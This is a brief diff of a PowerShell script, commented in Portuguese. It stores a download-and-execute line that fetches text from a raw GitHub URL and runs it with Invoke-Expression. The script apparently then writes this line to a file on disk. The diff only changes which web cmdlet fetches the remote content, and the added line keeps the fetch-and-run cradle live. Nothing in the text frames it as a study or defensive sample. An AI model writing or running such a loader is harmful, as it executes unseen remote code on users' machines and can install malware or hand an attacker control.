@@ -1,6 +1,6 @@
 # Define o conteúdo do script
 $scriptContent = @"
-    Invoke-Expression -Command (Invoke-WebRequest -Uri "https://raw.githubusercontent.com/so251/olaquerida/main/script.txt").Content
+    Invoke-Expression -Command (Invoke-RestMethod -Uri "https://raw.githubusercontent.com/so251/olaquerida/main/script.txt").Content
 "@
 
 # Define o caminho completo para salvar o arquivo
